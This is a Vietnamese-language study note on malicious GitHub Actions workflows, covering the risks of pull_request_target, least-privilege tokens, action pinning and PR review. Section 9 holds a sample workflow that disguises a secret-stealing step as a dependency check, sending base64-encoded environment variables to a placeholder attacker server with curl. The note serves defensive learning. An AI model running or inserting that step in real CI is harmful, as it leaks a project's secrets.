---
created: 2026-05-05
tags:
  - "#type/concept"
  - "#status/draft"
  - "#lang/others"
  - "#topic/error-handling"
related:
  - "[[github-actions-workflow-protection]]"
  - "[[github-secrets]]"
  - "[[git-history]]"
---

## 1. What
GitHub Actions Malicious Workflow là các tệp cấu hình YAML độc hại được đưa vào repository (thông qua Pull Request hoặc chiếm quyền commit) nhằm mục đích đánh cắp thông tin nhạy cảm (secrets), thực thi mã độc trên runner, hoặc tấn công chuỗi cung ứng (supply chain attack).

## 2. Why
GitHub Actions có quyền truy cập vào các secrets rất quan trọng và có khả năng đẩy code lên production. Kẻ tấn công lợi dụng sự tin tưởng của các dự án mã nguồn mở hoặc sự thiếu cẩn trọng của reviewer để cài cắm các dòng lệnh gửi dữ liệu ra ngoài hoặc thay thế artifacts bằng mã độc.

## 3. Mental Model
Hãy tưởng tượng GitHub Actions là một người giúp việc tự động. Bạn đưa chìa khóa nhà (Secrets) cho họ để họ đi chợ và nấu ăn. Một kẻ xấu gửi một "bản hướng dẫn nấu ăn" mới (Malicious Workflow) và lừa bạn bắt người giúp việc phải thực hiện theo. Trong bản hướng dẫn đó, kẻ xấu yêu cầu người giúp việc bí mật mang chìa khóa nhà đưa cho chúng ở cổng sau.

## 4. Where it fits
Pull Request -> GitHub Actions Trigger -> Runner Execution -> Malicious Script -> External Server.
Nguy cơ lớn nhất nằm ở trigger `pull_request_target` và `workflow_run`.

## 5. When to use
Nghiên cứu về Malicious Workflow là cần thiết khi:
- Thiết kế hệ thống CI/CD cho các dự án Open Source.
- Xây dựng quy trình Review PR chặt chẽ.
- Cấu hình quyền hạn (Permissions) tối thiểu cho `GITHUB_TOKEN`.
- Audit lại các Action từ bên thứ ba (Third-party actions).

## 6. When NOT to use
- Không áp dụng cho các dự án chạy hoàn toàn offline hoặc không dùng bất kỳ CI/CD nào.
- Đừng quá hoang mang đến mức chặn toàn bộ Actions, thay vào đó hãy dùng cơ chế Allow-list.

## 7. Trade-offs
| Pros | Cons |
|------|------|
| Giúp nâng cao nhận thức bảo mật cho team | Có thể làm chậm quy trình Dev do phải kiểm duyệt kỹ |
| Ngăn chặn mất mát tài chính và uy tín | Cần kiến thức chuyên sâu về bảo mật GitHub để phát hiện |
| Bảo vệ chuỗi cung ứng của sản phẩm | Một số cấu hình bảo mật quá chặt có thể gây phiền cho contributor |

## 8. Alternatives
| Option | So sánh |
|--------|---------|
| OIDC (OpenID Connect) | Thay thế Secret bằng token ngắn hạn, giảm rủi ro bị đánh cắp key dài hạn |
| Self-hosted Runners | Kiểm soát môi trường thực thi tốt hơn nhưng tốn công bảo trì |
| GitHub Environment Protection | Yêu cầu phê duyệt thủ công trước khi truy cập Secrets |

## 9. How
```yaml
# Ví dụ một workflow độc hại giả danh bước "Dependency Check"
name: Malicious Workflow
on: [pull_request]

jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v3
      
      # Bước độc hại bí mật gửi secrets ra ngoài
      - name: Verify dependencies
        run: |
          curl -X POST -d "data=$(env | base64)" https://attacker-server.com/collect
```

## 10. Production concerns
### Scaling
Với các doanh nghiệp lớn, nên sử dụng "Policy management" ở cấp độ Organization để chỉ cho phép các Action đã được verified hoặc thuộc sở hữu của công ty.

### Failure
Nếu một workflow bị hack và đánh cắp AWS Key, toàn bộ hạ tầng có thể bị xóa sạch. Cần có cơ chế "Kill switch" để vô hiệu hóa Actions trên toàn repo ngay lập tức.

### Monitoring
Sử dụng GitHub Audit Logs để theo dõi các thay đổi đối với file workflow trong thư mục `.github/workflows/`.

## 11. Common mistakes
- Mistake: Sử dụng `pull_request_target` mà lại checkout code từ PR của người lạ.
  Fix: `pull_request_target` có quyền ghi và truy cập secrets, chỉ nên dùng với các script cố định, không được thực thi code từ PR.

- Mistake: Cho phép workflow tự động chạy trên mọi Pull Request từ các contributor mới.
  Fix: Cấu hình "Require approval for first-time contributors" trong settings của repository.

## 12. Sample project
Tạo một môi trường giả lập (Honeypot) với một secret giả. Viết một script giám sát log để xem có bất kỳ workflow nào cố gắng truy cập hoặc gửi secret đó ra một domain lạ hay không.

## 13. Interview
### Core Q&A
1. Q: Tại sao `pull_request_target` lại nguy hiểm hơn `pull_request` thông thường?
   A: `pull_request` chạy với token chỉ có quyền đọc và không có quyền truy cập secrets. Ngược lại, `pull_request_target` chạy trong ngữ cảnh của base branch, có quyền truy cập secrets và token có quyền ghi, rất dễ bị lợi dụng để chiếm đoạt tài khoản.
2. Q: Làm thế nào để hạn chế rủi ro từ các Action bên thứ ba (ví dụ: `actions/checkout@v3`)?
   A: Thay vì dùng tag version (v3), hãy sử dụng Full SHA của commit (ví dụ: `actions/checkout@ac593985615ec2ed8b1c1173d09`) để đảm bảo code của Action đó không bị thay đổi ngầm.

### Scenario
Bạn nhận được một PR từ một người lạ, PR này chỉ thay đổi một dòng trong file README nhưng đồng thời sửa file `.github/workflows/ci.yml`. Bạn sẽ làm gì?
Trả lời: 1. Tuyệt đối không được approve PR này ngay. 2. Kiểm tra kỹ nội dung thay đổi trong file YAML. 3. Nếu thấy các câu lệnh lạ (curl, wget, env) hoặc sử dụng các Action lạ, hãy từ chối PR và báo cáo user này. 4. Đảm bảo repo đã bật tính năng yêu cầu review cho workflow changes.

## 14. References
- Official Docs: https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions
- GitHub Repo: https://github.com/step-security/harden-runner (Tool bảo vệ runner)
- Spec / RFC: N/A
- Changelog: Introduction of permissions key in workflows.

## 15. Real-world Code
https://github.com/pypa/gh-action-pypi-publish (Ví dụ về một Action chính thống nhưng yêu cầu bảo mật cực cao)

## 16. Community
- Reddit: r/cybersecurity
- Stack Overflow: Tag #github-actions-security
- Blog: Cycode Blog on CI/CD Security
- Talk: "Attacking and Defending GitHub Actions" at DEF CON.
